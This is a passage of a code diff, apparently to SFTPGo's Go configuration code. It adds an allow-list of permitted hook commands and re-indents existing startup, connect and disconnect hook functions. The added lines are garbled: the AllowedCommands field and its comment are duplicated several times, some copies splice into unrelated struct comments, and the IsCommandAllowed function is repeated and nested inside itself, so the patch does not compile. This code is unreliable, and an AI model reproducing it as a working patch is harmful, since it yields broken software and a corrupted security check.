synchronously.\n+// Supported events: \"upload\", \"download\", \"delete\", \"rename\", \"mkdir\", \"rmdir\", \"ssh_cmd\",\n+// \"pre-delete\", \"pre-upload\", \"pre-download\"\n+ExecuteSync string `json:\"execute_sync\" mapstructure:\"execute_sync\"`\n+// A list of allowed commands for command execution event actions.\n+// If not empty, an event action that executes a command will fail if the\n+// command is not in this list. For security reasons, starting from v2.6.3,\n+// commands must be in this list. Set it to `[\"*\"]` to allow any command\n+// for backward compatibility.\n+AllowedCommands []string `json:\"allowed_commands\" mapstructure:\"allowed_commands\"`\n+}\n+\n+// IsCommandAllowed checks if a command is allowed\n+func IsCommandAllowed(cmd string, allowed []string) bool {\n+if len(allowed) == 0 {\n+return false\n+}\n+\n+if slices.Contains(allowed, \"*\") {\n+return true\n+}\n+\n+return slices.Contains(allowed, cmd)\n+// A list of allowed commands for command execution event actions.\n+// If not empty, an event action that executes a command will fail if the\n+// command is not in this list. For security reasons, starting from v2.6.3,\n+// commands must be in this list. Set it to `[]string{\"*\"}` to allow any command\n+// for backward compatibility.\n+AllowedCommands []string `json:\"allowed_commands\" mapstructure:\"allowed_commands\"`\n+}\n+\n+// Actions defines actions that can be executed on different events\n+type Actions struct {\n+// Path to a program/script to execute.\n+Hook string `json:\"hook\" mapstructure:\"hook\"`\n+// Comma separated list of the events that will trigger the hook.\n+// Supported events: \"upload\", \"download\", \"delete\", \"rename\", \"mkdir\", \"rmdir\", \"ssh_cmd\",\n+// \"pre-delete\", \"pre-upload\", \"pre-download\"\n+ExecuteOn string `json:\"execute_on\" mapstructure:\"execute_on\"`\n+// Comma separated list of the events that must be executed synchronously.\n+// Supported events: \"upload\", \"download\", \"delete\", \"rename\", \"mkdir\", \"rmdir\", \"ssh_cmd\",\n+// \"pre-delete\", \"pre-upload\", \"pre-download\"\n+ExecuteSync string `json:\"execute_sync\" mapstructure:\"execute_sync\"`\n+// A list of allowed commands for command execution event actions.\n+// If not empty, an event action that executes a command will fail if the\n+// command is not in this list. For security reasons, starting from v2.6.3,\n+// commands must be in this list. Set it to `[]string{\"*\"}` to allow any command\n+// for backward compatibility.\n+AllowedCommands []string `json:\"allowed_commands\" mapstructure:\"allowed_commands\"`\n+}\n+\n+// IsCommandAllowed checks if a command is allowed\n+func IsCommandAllowed(cmd string, allowed []string) bool {\n+if len(allowed) == 0 {\n+\n+// IsCommandAllowed checks if a command is allowed\n+func IsCommandAllowed(cmd string, allowed []string) bool {\n+if len(allowed) == 0 {\n+return false\n+}\n+if slices.Contains(allowed, \"*\") {\n+return true\n+}\n+return slices.Contains(allowed, cmd)\n+}\n+\n+return false\n+}\n+\n+if slices.Contains(allowed, \"*\") {\n+return true\n+}\n+\n+return slices.Contains(allowed, cmd)\n+}\n+\n type Configuration struct {\n-\t// Maximum idle timeout as minutes. If a client is idle for a time that exceeds this setting it will be disconnected.\n-\t// 0 means disabled\n-\tIdleTimeout int `json:\"idle_timeout\" mapstructure:\"idle_timeout\"`\n-\t// UploadMode 0 means standard, the files are uploaded directly to the requested path.\n-\t// 1 means atomic: the files are uploaded to a temporary path and renamed to the requested path\n-\t// when the client ends the upload. Atomic mode avoid problems such as a web server that\n-\t// serves partial files when the files are being uploaded.\n-\t// In atomic mode if there is an upload error the temporary file is deleted and so the requested\n-\t// upload path will not contain a partial file.\n-\t// 2 means atomic with resume support: as atomic but if there is an upload error the temporary\n-\t// file is renamed to the requested path and not deleted, this way a client can reconnect and resume\n-\t// the upload.\n-\t// 4 means files for S3 backend are stored even if a client-side upload error is detected.\n-\t// 8 means files for Google Cloud Storage backend are stored even if a client-side upload error is detected.\n-\t// 16 means files for Azure Blob backend are stored even if a client-side upload error is detected.\n-\tUploadMode int `json:\"upload_mode\" mapstructure:\"upload_mode\"`\n-\t// Actions to execute for SFTP file operations and SSH commands\n-\tActions ProtocolActions `json:\"actions\" mapstructure:\"actions\"`\n-\t// SetstatMode 0 means \"normal mode\": requests for changing permissions and owner/group are executed.\n-\t// 1 means \"ignore mode\": requests for changing permissions and owner/group are silently ignored.\n-\t// 2 means \"ignore mode for cloud fs\": requests for changing permissions and owner/group are\n-\t// silently ignored for cloud based filesystem such as S3, GCS, Azure Blob. Requests  for changing\n-\t// modification times are ignored for cloud based filesystem if they are not supported.\n-\tSetstatMode int `json:\"setstat_mode\" mapstructure:\"setstat_mode\"`\n-\t// RenameMode defines how to handle directory renames. By default, renaming of non-empty directories\n-\t// is not allowed for cloud storage providers (S3, GCS, Azure Blob). Set to 1 to enable recursive\n-\t// renames for these providers, they may be slow, there is no atomic rename API like for local\n-\t// filesystem, so SFTPGo will recursively list the directory contents and do a rename for each entry\n-\tRenameMode int `json:\"rename_mode\" mapstructure:\"rename_mode\"`\n-\t// ResumeMaxSize defines the maximum size allowed, in bytes, to resume uploads on storage backends\n-\t// with immutable objects. By default, resuming uploads is not allowed for cloud storage providers\n-\t// (S3, GCS, Azure Blob) because SFTPGo must rewrite the entire file.\n-\t// Set to a value greater than 0 to allow resuming uploads of files smaller than or equal to the\n-\t// defined size.\n-\tResumeMaxSize int64 `json:\"resume_max_size\" mapstructure:\"resume_max_size\"`\n-\t// TempPath defines the path for temporary files such as those used for atomic uploads or file pipes.\n-\t// If you set this option you must make sure that the defined path exists, is accessible for writing\n-\t// by the user running SFTPGo, and is on the same filesystem as the users home directories otherwise\n-\t// the renaming for atomic uploads will become a copy and therefore may take a long time.\n-\t// The temporary files are not namespaced. The default is generally fine. Leave empty for the default.\n-\tTempPath string `json:\"temp_path\" mapstructure:\"temp_path\"`\n-\t// Support for HAProxy PROXY protocol.\n-\t// If you are running SFTPGo behind a proxy server such as HAProxy, AWS ELB or NGNIX, you can enable\n-\t// the proxy protocol. It provides a convenient way to safely transport connection information\n-\t// such as a client's address across multiple layers of NAT or TCP proxies to get the real\n-\t// client IP address instead of the proxy IP. Both protocol versions 1 and 2 are supported.\n-\t// - 0 means disabled\n-\t// - 1 means proxy protocol enabled. Proxy header will be used and requests without proxy header will be accepted.\n-\t// - 2 means proxy protocol required. Proxy header will be used and requests without proxy header will be rejected.\n-\t// If the proxy protocol is enabled in SFTPGo then you have to enable the protocol in your proxy configuration too,\n-\t// for example for HAProxy add \"send-proxy\" or \"send-proxy-v2\" to each server configuration line.\n-\tProxyProtocol int `json:\"proxy_protocol\" mapstructure:\"proxy_protocol\"`\n-\t// List of IP addresses and IP ranges allowed to send the proxy header.\n-\t// If proxy protocol is set to 1 and we receive a proxy header from an IP that is not in the list then the\n-\t// connection will be accepted and the header will be ignored.\n-\t// If proxy protocol is set to 2 and we receive a proxy header from an IP that is not in the list then the\n-\t// connection will be rejected.\n-\tProxyAllowed []string `json:\"proxy_allowed\" mapstructure:\"proxy_allowed\"`\n-\t// List of IP addresses and IP ranges for which not to read the proxy header\n-\tProxySkipped []string `json:\"proxy_skipped\" mapstructure:\"proxy_skipped\"`\n-\t// Absolute path to an external program or an HTTP URL to invoke as soon as SFTPGo starts.\n-\t// If you define an HTTP URL it will be invoked using a `GET` request.\n-\t// Please note that SFTPGo services may not yet be available when this hook is run.\n-\t// Leave empty do disable.\n-\tStartupHook string `json:\"startup_hook\" mapstructure:\"startup_hook\"`\n-\t// Absolute path to an external program or an HTTP URL to invoke after a user connects\n-\t// and before he tries to login. It allows you to reject the connection based on the source\n-\t// ip address. Leave empty do disable.\n-\tPostConnectHook string `json:\"post_connect_hook\" mapstructure:\"post_connect_hook\"`\n-\t// Absolute path to an external program or an HTTP URL to invoke after an SSH/FTP connection ends.\n-\t// Leave empty do disable.\n-\tPostDisconnectHook string `json:\"post_disconnect_hook\" mapstructure:\"post_disconnect_hook\"`\n-\t// Absolute path to an external program or an HTTP URL to invoke after a data retention check completes.\n-\t// Leave empty do disable.\n-\tDataRetentionHook string `json:\"data_retention_hook\" mapstructure:\"data_retention_hook\"`\n-\t// Maximum number of concurrent client connections. 0 means unlimited\n-\tMaxTotalConnections int `json:\"max_total_connections\" mapstructure:\"max_total_connections\"`\n-\t// Maximum number of concurrent client connections from the same host (IP). 0 means unlimited\n-\tMaxPerHostConnections int `json:\"max_per_host_connections\" mapstructure:\"max_per_host_connections\"`\n-\t// Defines the status of the global allow list. 0 means disabled, 1 enabled.\n-\t// If enabled, only the listed IPs/networks can access the configured services, all other\n-\t// client connections will be dropped before they even try to authenticate.\n-\t// Ensure to enable this setting only after adding some allowed ip/networks from the WebAdmin/REST API\n-\tAllowListStatus int `json:\"allowlist_status\" mapstructure:\"allowlist_status\"`\n-\t// Allow users on this instance to use other users/virtual folders on this instance as storage backend.\n-\t// Enable this setting if you know what you are doing.\n-\tAllowSelfConnections int `json:\"allow_self_connections\" mapstructure:\"allow_self_connections\"`\n-\t// Defender configuration\n-\tDefenderConfig DefenderConfig `json:\"defender\" mapstructure:\"defender\"`\n-\t// Rate limiter configurations\n-\tRateLimitersConfig []RateLimiterConfig `json:\"rate_limiters\" mapstructure:\"rate_limiters\"`\n-\t// Umask for new uploads. Leave blank to use the system default.\n-\tUmask string `json:\"umask\" mapstructure:\"umask\"`\n-\t// Defines the server version\n-\tServerVersion string `json:\"server_version\" mapstructure:\"server_version\"`\n-\t// TZ defines the time zone to use for the EventManager scheduler and to\n-\t// control time-based access restrictions. Set to \"local\" to use the\n-\t// server's local time, otherwise UTC will be used.\n-\tTZ string `json:\"tz\" mapstructure:\"tz\"`\n-\t// Metadata configuration\n-\tMetadata              MetadataConfig `json:\"metadata\" mapstructure:\"metadata\"`\n-\tidleTimeoutAsDuration time.Duration\n-\tidleLoginTimeout      time.Duration\n-\tdefender              Defender\n-\tallowList             *dataprovider.IPList\n-\trateLimitersList      *dataprovider.IPList\n-\tproxyAllowed          []func(net.IP) bool\n-\tproxySkipped          []func(net.IP) bool\n+        // Maximum idle timeout as minutes. If a client is idle for a time that exceeds this setting it will be disconnected.\n+        // 0 means disabled\n+        IdleTimeout int `json:\"idle_timeout\" mapstructure:\"idle_timeout\"`\n+        // UploadMode 0 means standard, the files are uploaded directly to the requested path.\n+        // 1 means atomic: the files are uploaded to a temporary path and renamed to the requested path\n+        // when the client ends the upload. Atomic mode avoid problems such as a web server that\n+        // serves partial files when the files are being uploaded.\n+        // In atomic mode if there is an upload error the temporary file is deleted and so the requested\n+        // upload path will not contain a partial file.\n+        // 2 means atomic with resume support: as atomic but if there is an upload error the temporary\n+        // file is renamed to the requested path and not deleted, this way a client can reconnect and resume\n+        // the upload.\n+        // 4 means files for S3 backend are stored even if a client-side upload error is detected.\n+        // 8 means files for Google Cloud Storage backend are stored even if a client-side upload error is detected.\n+        // 16 means files for Azure Blob backend are stored even if a client-side upload error is detected.\n+        UploadMode int `json:\"upload_mode\" mapstructure:\"upload_mode\"`\n+        // Actions to execute for SFTP file operations and SSH commands\n+        Actions ProtocolActions `json:\"actions\" mapstructure:\"actions\"`\n+        // SetstatMode 0 means \"normal mode\": requests for changing permissions and owner/group are executed.\n+        // 1 means \"ignore mode\": requests for changing permissions and owner/group are silently ignored.\n+        // 2 means \"ignore mode for cloud fs\": requests for changing permissions and owner/group are\n+        // silently ignored for cloud based filesystem such as S3, GCS, Azure Blob. Requests  for changing\n+        // modification times are ignored for cloud based filesystem if they are not supported.\n+        SetstatMode int `json:\"setstat_mode\" mapstructure:\"setstat_mode\"`\n+        // RenameMode defines how to handle directory renames. By default, renaming of non-empty directories\n+        // is not allowed for cloud storage providers (S3, GCS, Azure Blob). Set to 1 to enable recursive\n+        // renames for these providers, they may be slow, there is no atomic rename API like for local\n+        // filesystem, so SFTPGo will recursively list the directory contents and do a rename for each entry\n+        RenameMode int `json:\"rename_mode\" mapstructure:\"rename_mode\"`\n+        // ResumeMaxSize defines the maximum size allowed, in bytes, to resume uploads on storage backends\n+        // with immutable objects. By default, resuming uploads is not allowed for cloud storage providers\n+        // (S3, GCS, Azure Blob) because SFTPGo must rewrite the entire file.\n+        // Set to a value greater than 0 to allow resuming uploads of files smaller than or equal to the\n+        // defined size.\n+        ResumeMaxSize int64 `json:\"resume_max_size\" mapstructure:\"resume_max_size\"`\n+        // TempPath defines the path for temporary files such as those used for atomic uploads or file pipes.\n+        // If you set this option you must make sure that the defined path exists, is accessible for writing\n+        // by the user running SFTPGo, and is on the same filesystem as the users home directories otherwise\n+        // the renaming for atomic uploads will become a copy and therefore may take a long time.\n+        // The temporary files are not namespaced. The default is generally fine. Leave empty for the default.\n+        TempPath string `json:\"temp_path\" mapstructure:\"temp_path\"`\n+        // Support for HAProxy PROXY protocol.\n+        // If you are running SFTPGo behind a proxy server such as HAProxy, AWS ELB or NGNIX, you can enable\n+// A list of allowed commands for command execution event actions.\n+// If not empty, an event action that executes a command will fail if the\n+// command is not in this list. For security reasons, starting from v2.6.3,\n+// commands must be in this list. Set it to `[\"*\"]` to allow any command\n+// for backward compatibility.\n+AllowedCommands []string `json:\"allowed_commands\" mapstructure:\"allowed_commands\"`\n+// A list of allowed commands for command execution event actions.\n+// If not empty, an event action that executes a command will fail if the\n+// command is not in this list. For security reasons, starting from v2.6.3,\n+// commands must be in this list. Set it to `[\"*\"]` to allow any command\n+// for backward compatibility.\n+AllowedCommands []string `json:\"allowed_commands\" mapstructure:\"allowed_commands\"`\n+        // the proxy protocol. It provides a convenient way to safely transport connection information\n+        // such as a client's address across multiple layers of NAT or TCP proxies to get the real\n+        // client IP address instead of the proxy IP. Both protocol versions 1 and 2 are supported.\n+        // - 0 means disabled\n+        // - 1 means proxy protocol enabled. Proxy header will be used and requests without proxy header will be accepted.\n+        // - 2 means proxy protocol required. Proxy header will be used and requests without proxy header will be rejected.\n+        // If the proxy protocol is enabled in SFTPGo then you have to enable the protocol in your proxy configuration too,\n+        // for example for HAProxy add \"send-proxy\" or \"send-proxy-v2\" to each server configuration line.\n+        ProxyProtocol int `json:\"proxy_protocol\" mapstructure:\"proxy_protocol\"`\n+        // List of IP addresses and IP ranges allowed to send the proxy header.\n+        // If proxy protocol is set to 1 and we receive a proxy header from an IP that is not in the list then the\n+        // connection will be accepted and the header will be ignored.\n+        // If proxy protocol is set to 2 and we receive a proxy header from an IP that is not in the list then the\n+        // connection will be rejected.\n+        ProxyAllowed []string `json:\"proxy_allowed\" mapstructure:\"proxy_allowed\"`\n+        // List of IP addresses and IP ranges for which not to read the proxy header\n+        ProxySkipped []string `json:\"proxy_skipped\" mapstructure:\"proxy_skipped\"`\n+        // Absolute path to an external program or an HTTP URL to invoke as soon as SFTPGo starts.\n+        // If you define an HTTP URL it will be invoked using a `GET` request.\n+        // Please note that SFTPGo services may not yet be available when this hook is run.\n+        // Leave empty do disable.\n+        StartupHook string `json:\"startup_hook\" mapstructure:\"startup_hook\"`\n+        // Absolute path to an external program or an HTTP URL to invoke after a user connects\n+        // and before he tries to login. It allows you to reject the connection based on the source\n+        // ip address. Leave empty do disable.\n+        PostConnectHook string `json:\"post_connect_hook\" mapstructure:\"post_connect_hook\"`\n+        // Absolute path to an external program or an HTTP URL to invoke after an SSH/FTP connection ends.\n+        // Leave empty do disable.\n+        PostDisconnectHook string `json:\"post_disconnect_hook\" mapstructure:\"post_disconnect_hook\"`\n+        // Absolute path to an external program or an HTTP URL to invoke after a data retention check completes.\n+        // Leave empty do disable.\n+        DataRetentionHook string `json:\"data_retention_hook\" mapstructure:\"data_retention_hook\"`\n+        // Maximum number of concurrent client connections. 0 means unlimited\n+        MaxTotalConnections int `json:\"max_total_connections\" mapstructure:\"max_total_connections\"`\n+        // Maximum number of concurrent client connections from the same host (IP). 0 means unlimited\n+        MaxPerHostConnections int `json:\"max_per_host_connections\" mapstructure:\"max_per_host_connections\"`\n+        // Defines the status of the global allow list. 0 means disabled, 1 enabled.\n+        // If enabled, only the listed IPs/networks can access the configured services, all other\n+        // client connections will be dropped before they even try to authenticate.\n+        // Ensure to enable this setting only after adding some allowed ip/networks from the WebAdmin/REST API\n+        AllowListStatus int `json:\"allowlist_status\" mapstructure:\"allowlist_status\"`\n+        // Allow users on this instance to use other users/virtual folders on this instance as storage backend.\n+        // Enable this setting if you know what you are doing.\n+        AllowSelfConnections int `json:\"allow_self_connections\" mapstructure:\"allow_self_connections\"`\n+        // Defender configuration\n+        DefenderConfig DefenderConfig `json:\"defender\" mapstructure:\"defender\"`\n+        // Rate limiter configurations\n+        RateLimitersConfig []RateLimiterConfig `json:\"rate_limiters\" mapstructure:\"rate_limiters\"`\n+        // Umask for new uploads. Leave blank to use the system default.\n+        Umask string `json:\"umask\" mapstructure:\"umask\"`\n+        // Defines the server version\n+        ServerVersion string `json:\"server_version\" mapstructure:\"server_version\"`\n+        // TZ defines the time zone to use for the EventManager scheduler and to\n+        // control time-based access restrictions. Set to \"local\" to use the\n+        // server's local time, otherwise UTC will be used.\n+        TZ string `json:\"tz\" mapstructure:\"tz\"`\n+        // Metadata configuration\n+        Metadata              MetadataConfig `json:\"metadata\" mapstructure:\"metadata\"`\n+        idleTimeoutAsDuration time.Duration\n+        idleLoginTimeout      time.Duration\n+        defender              Defender\n+        allowList             *dataprovider.IPList\n+        rateLimitersList      *dataprovider.IPList\n+        proxyAllowed          []func(net.IP) bool\n+        proxySkipped          []func(net.IP) bool\n }\n \n // IsAtomicUploadEnabled returns true if atomic upload is enabled\n func (c *Configuration) IsAtomicUploadEnabled() bool {\n-\treturn c.UploadMode&UploadModeAtomic != 0 || c.UploadMode&UploadModeAtomicWithResume != 0\n+        return c.UploadMode&UploadModeAtomic != 0 || c.UploadMode&UploadModeAtomicWithResume != 0\n }\n \n func (c *Configuration) initializeProxyProtocol() error {\n-\tif c.ProxyProtocol > 0 {\n-\t\tallowed, err := util.ParseAllowedIPAndRanges(c.ProxyAllowed)\n-\t\tif err != nil {\n-\t\t\treturn fmt.Errorf(\"invalid proxy allowed: %w\", err)\n-\t\t}\n-\t\tskipped, err := util.ParseAllowedIPAndRanges(c.ProxySkipped)\n-\t\tif err != nil {\n-\t\t\treturn fmt.Errorf(\"invalid proxy skipped: %w\", err)\n-\t\t}\n-\t\tConfig.proxyAllowed = allowed\n-\t\tConfig.proxySkipped = skipped\n-\t}\n-\treturn nil\n+        if c.ProxyProtocol > 0 {\n+                allowed, err := util.ParseAllowedIPAndRanges(c.ProxyAllowed)\n+                if err != nil {\n+                        return fmt.Errorf(\"invalid proxy allowed: %w\", err)\n+                }\n+                skipped, err := util.ParseAllowedIPAndRanges(c.ProxySkipped)\n+                if err != nil {\n+                        return fmt.Errorf(\"invalid proxy skipped: %w\", err)\n+                }\n+                Config.proxyAllowed = allowed\n+                Config.proxySkipped = skipped\n+        }\n+        return nil\n }\n \n // GetProxyListener returns a wrapper for the given listener that supports the\n // HAProxy Proxy Protocol\n func (c *Configuration) GetProxyListener(listener net.Listener) (net.Listener, error) {\n-\tif c.ProxyProtocol > 0 {\n-\t\tdefaultPolicy := proxyproto.REQUIRE\n-\t\tif c.ProxyProtocol == 1 {\n-\t\t\tdefaultPolicy = proxyproto.IGNORE\n-\t\t}\n+        if c.ProxyProtocol > 0 {\n+                defaultPolicy := proxyproto.REQUIRE\n+                if c.ProxyProtocol == 1 {\n+                        defaultPolicy = proxyproto.IGNORE\n+                }\n \n-\t\treturn &proxyproto.Listener{\n-\t\t\tListener:          listener,\n-\t\t\tConnPolicy:        getProxyPolicy(c.proxyAllowed, c.proxySkipped, defaultPolicy),\n-\t\t\tReadHeaderTimeout: 10 * time.Second,\n-\t\t}, nil\n-\t}\n-\treturn nil, errors.New(\"proxy protocol not configured\")\n+                return &proxyproto.Listener{\n+                        Listener:          listener,\n+                        ConnPolicy:        getProxyPolicy(c.proxyAllowed, c.proxySkipped, defaultPolicy),\n+                        ReadHeaderTimeout: 10 * time.Second,\n+                }, nil\n+        }\n+        return nil, errors.New(\"proxy protocol not configured\")\n }\n \n // GetRateLimitersStatus returns the rate limiters status\n func (c *Configuration) GetRateLimitersStatus() (bool, []string) {\n-\tenabled := false\n-\tvar protocols []string\n-\tfor _, rlCfg := range c.RateLimitersConfig {\n-\t\tif rlCfg.isEnabled() {\n-\t\t\tenabled = true\n-\t\t\tprotocols = append(protocols, rlCfg.Protocols...)\n-\t\t}\n-\t}\n-\treturn enabled, util.RemoveDuplicates(protocols, false)\n+        enabled := false\n+        var protocols []string\n+        for _, rlCfg := range c.RateLimitersConfig {\n+                if rlCfg.isEnabled() {\n+                        enabled = true\n+                        protocols = append(protocols, rlCfg.Protocols...)\n+                }\n+        }\n+        return enabled, util.RemoveDuplicates(protocols, false)\n }\n \n // IsAllowListEnabled returns true if the global allow list is enabled\n func (c *Configuration) IsAllowListEnabled() bool {\n-\treturn c.AllowListStatus > 0\n+        return c.AllowListStatus > 0\n }\n \n // ExecuteStartupHook runs the startup hook if defined\n func (c *Configuration) ExecuteStartupHook() error {\n-\tif c.StartupHook == \"\" {\n-\t\treturn nil\n-\t}\n-\tif strings.HasPrefix(c.StartupHook, \"http\") {\n-\t\tvar url *url.URL\n-\t\turl, err := url.Parse(c.StartupHook)\n-\t\tif err != nil {\n-\t\t\tlogger.Warn(logSender, \"\", \"Invalid startup hook %q: %v\", c.StartupHook, err)\n-\t\t\treturn err\n-\t\t}\n-\t\tstartTime := time.Now()\n-\t\tresp, err := httpclient.RetryableGet(url.String())\n-\t\tif err != nil {\n-\t\t\tlogger.Warn(logSender, \"\", \"Error executing startup hook: %v\", err)\n-\t\t\treturn err\n-\t\t}\n-\t\tdefer resp.Body.Close()\n-\t\tlogger.Debug(logSender, \"\", \"Startup hook executed, elapsed: %v, response code: %v\", time.Since(startTime), resp.StatusCode)\n-\t\treturn nil\n-\t}\n-\tif !filepath.IsAbs(c.StartupHook) {\n-\t\terr := fmt.Errorf(\"invalid startup hook %q\", c.StartupHook)\n-\t\tlogger.Warn(logSender, \"\", \"Invalid startup hook %q\", c.StartupHook)\n-\t\treturn err\n-\t}\n-\tstartTime := time.Now()\n-\ttimeout, env, args := command.GetConfig(c.StartupHook, command.HookStartup)\n-\tctx, cancel := context.WithTimeout(context.Background(), timeout)\n-\tdefer cancel()\n-\n-\tcmd := exec.CommandContext(ctx, c.StartupHook, args...)\n-\tcmd.Env = env\n-\terr := cmd.Run()\n-\tlogger.Debug(logSender, \"\", \"Startup hook executed, elapsed: %s, error: %v\", time.Since(startTime), err)\n-\treturn nil\n+        if c.StartupHook == \"\" {\n+                return nil\n+        }\n+        if strings.HasPrefix(c.StartupHook, \"http\") {\n+                var url *url.URL\n+                url, err := url.Parse(c.StartupHook)\n+                if err != nil {\n+                        logger.Warn(logSender, \"\", \"Invalid startup hook %q: %v\", c.StartupHook, err)\n+                        return err\n+                }\n+                startTime := time.Now()\n+                resp, err := httpclient.RetryableGet(url.String())\n+                if err != nil {\n+                        logger.Warn(logSender, \"\", \"Error executing startup hook: %v\", err)\n+                        return err\n+                }\n+                defer resp.Body.Close()\n+                logger.Debug(logSender, \"\", \"Startup hook executed, elapsed: %v, response code: %v\", time.Since(startTime), resp.StatusCode)\n+                return nil\n+        }\n+        if !filepath.IsAbs(c.StartupHook) {\n+                err := fmt.Errorf(\"invalid startup hook %q\", c.StartupHook)\n+                logger.Warn(logSender, \"\", \"Invalid startup hook %q\", c.StartupHook)\n+                return err\n+        }\n+        startTime := time.Now()\n+        timeout, env, args := command.GetConfig(c.StartupHook, command.HookStartup)\n+        ctx, cancel := context.WithTimeout(context.Background(), timeout)\n+        defer cancel()\n+\n+        cmd := exec.CommandContext(ctx, c.StartupHook, args...)\n+        cmd.Env = env\n+        err := cmd.Run()\n+        logger.Debug(logSender, \"\", \"Startup hook executed, elapsed: %s, error: %v\", time.Since(startTime), err)\n+        return nil\n }\n \n func (c *Configuration) executePostDisconnectHook(remoteAddr, protocol, username, connID string, connectionTime time.Time) {\n-\tstartNewHook()\n-\tdefer hookEnded()\n-\n-\tipAddr := util.GetIPFromRemoteAddress(remoteAddr)\n-\tconnDuration := int64(time.Since(connectionTime) / time.Millisecond)\n-\n-\tif strings.HasPrefix(c.PostDisconnectHook, \"http\") {\n-\t\tvar url *url.URL\n-\t\turl, err := url.Parse(c.PostDisconnectHook)\n-\t\tif err != nil {\n-\t\t\tlogger.Warn(protocol, connID, \"Invalid post disconnect hook %q: %v\", c.PostDisconnectHook, err)\n-\t\t\treturn\n-\t\t}\n-\t\tq := url.Query()\n-\t\tq.Add(\"ip\", ipAddr)\n-\t\tq.Add(\"protocol\", protocol)\n-\t\tq.Add(\"username\", username)\n-\t\tq.Add(\"connection_duration\", strconv.FormatInt(connDuration, 10))\n-\t\turl.RawQuery = q.Encode()\n-\t\tstartTime := time.Now()\n-\t\tresp, err := httpclient.RetryableGet(url.String())\n-\t\trespCode := 0\n-\t\tif err == nil {\n-\t\t\trespCode = resp.StatusCode\n-\t\t\tresp.Body.Close()\n-\t\t}\n-\t\tlogger.Debug(protocol, connID, \"Post disconnect hook response code: %v, elapsed: %v, err: %v\",\n-\t\t\trespCode, time.Since(startTime), err)\n-\t\treturn\n-\t}\n-\tif !filepath.IsAbs(c.PostDisconnectHook) {\n-\t\tlogger.Debug(protocol, connID, \"invalid post disconnect hook %q\", c.PostDisconnectHook)\n-\t\treturn\n-\t}\n-\ttimeout, env, args := command.GetConfig(c.PostDisconnectHook, command.HookPostDisconnect)\n-\tctx, cancel := context.WithTimeout(context.Background(), timeout)\n-\tdefer cancel()\n-\n-\tstartTime := time.Now()\n-\tcmd := exec.CommandContext(ctx, c.PostDisconnectHook, args...)\n-\tcmd.Env = append(env,\n-\t\tfmt.Sprintf(\"SFTPGO_CONNECTION_IP=%s\", ipAddr),\n-\t\tfmt.Sprintf(\"SFTPGO_CONNECTION_USERNAME=%s\", username),\n-\t\tfmt.Sprintf(\"SFTPGO_CONNECTION_DURATION=%d\", connDuration),\n-\t\tfmt.Sprintf(\"SFTPGO_CONNECTION_PROTOCOL=%s\", protocol))\n-\terr := cmd.Run()\n-\tlogger.Debug(protocol, connID, \"Post disconnect hook executed, elapsed: %s error: %v\", time.Since(startTime), err)\n+        startNewHook()\n+        defer hookEnded()\n+\n+        ipAddr := util.GetIPFromRemoteAddress(remoteAddr)\n+        connDuration := int64(time.Since(connectionTime) / time.Millisecond)\n+\n+        if strings.HasPrefix(c.PostDisconnectHook, \"http\") {\n+                var url *url.URL\n+                url, err := url.Parse(c.PostDisconnectHook)\n+                if err != nil {\n+                        logger.Warn(protocol, connID, \"Invalid post disconnect hook %q: %v\", c.PostDisconnectHook, err)\n+                        return\n+                }\n+                q := url.Query()\n+                q.Add(\"ip\", ipAddr)\n+                q.Add(\"protocol\", protocol)\n+                q.Add(\"username\", username)\n+                q.Add(\"connection_duration\", strconv.FormatInt(connDuration, 10))\n+                url.RawQuery = q.Encode()\n+                startTime := time.Now()\n+                resp, err := httpclient.RetryableGet(url.String())\n+                respCode := 0\n+                if err == nil {\n+                        respCode = resp.StatusCode\n+                        resp.Body.Close()\n+                }\n+                logger.Debug(protocol, connID, \"Post disconnect hook response code: %v, elapsed: %v, err: %v\",\n+                        respCode, time.Since(startTime), err)\n+                return\n+        }\n+        if !filepath.IsAbs(c.PostDisconnectHook) {\n+                logger.Debug(protocol, connID, \"invalid post disconnect hook %q\", c.PostDisconnectHook)\n+                return\n+        }\n+        timeout, env, args := command.GetConfig(c.PostDisconnectHook, command.HookPostDisconnect)\n+        ctx, cancel := context.WithTimeout(context.Background(), timeout)\n+        defer cancel()\n+\n+        startTime := time.Now()\n+        cmd := exec.CommandContext(ctx, c.PostDisconnectHook, args...)\n+        cmd.Env = append(env,\n+                fmt.Sprintf(\"SFTPGO_CONNECTION_IP=%s\", ipAddr),\n+                fmt.Sprintf(\"SFTPGO_CONNECTION_USERNAME=%s\", username),\n+                fmt.Sprintf(\"SFTPGO_CONNECTION_DURATION=%d\", connDuration),\n+                fmt.Sprintf(\"SFTPGO_CONNECTION_PROTOCOL=%s\", protocol))\n+        err := cmd.Run()\n+        logger.Debug(protocol, connID, \"Post disconnect hook executed, elapsed: %s error: %v\", time.Since(startTime), err)\n }\n \n func (c *Configuration) checkPostDisconnectHook(remoteAddr, protocol, username, connID string, connectionTime time.Time) {\n-\tif c.PostDisconnectHook == \"\" {\n-\t\treturn\n-\t}\n-\tif !slices.Contains(disconnHookProtocols, protocol) {\n-\t\treturn\n-\t}\n-\tgo c.executePostDisconnectHook(remoteAddr, protocol, username, connID, connectionTime)\n+        if c.PostDisconnectHook == \"\" {\n+                return\n+        }\n+        if !slices.Contains(disconnHookProtocols, protocol) {\n+                return\n+        }\n+        go c.executePostDisconnectHook(remoteAddr, protocol, username, connID, connectionTime)\n }\n \n // ExecutePostConnectHook executes the post connect hook if defined\n func (c *Configuration) ExecutePostConnectHook(ipAddr, protocol string) error {\n-\tif c.PostConnectHook == \"\" {\n-\t\treturn nil\n-\t}\n-\tif strings.HasPrefix(c.PostConnectHook, \"http\") {\n-\t\tvar url *url.URL\n-\t\turl, err := url.Parse(c.PostConnectHook)\n-\t\tif err != nil {\n-\t\t\tlogger.Warn(protocol, \"\", \"Login from ip %q denied, invalid post connect hook %q: %v\",\n-\t\t\t\tipAddr, c.PostConnectHook, err)\n-\t\t\treturn getPermissionDeniedError(protocol)\n-\t\t}\n-\t\tq := url.Query()\n-\t\tq.Add(\"ip\", ipAddr)\n-\t\tq.Add(\"protocol\", protocol)\n-\t\turl.RawQuery = q.Encode()\n-\n-\t\tresp, err := httpclient.RetryableGet(url.String())\n-\t\tif err != nil {\n-\t\t\tlogger.Warn(protocol, \"\", \"Login from ip %q denied, error executing post connect hook: %v\", ipAddr, err)\n-\t\t\treturn getPermissionDeniedError(protocol)\n-\t\t}\n-\t\tdefer resp.Body.Close()\n-\t\tif resp.StatusCode != http.StatusOK {\n-\t\t\tlogger.Warn(protocol, \"\", \"Login from ip %q denied, post connect hook response code: %v\", ipAddr, resp.StatusCode)\n-\t\t\treturn 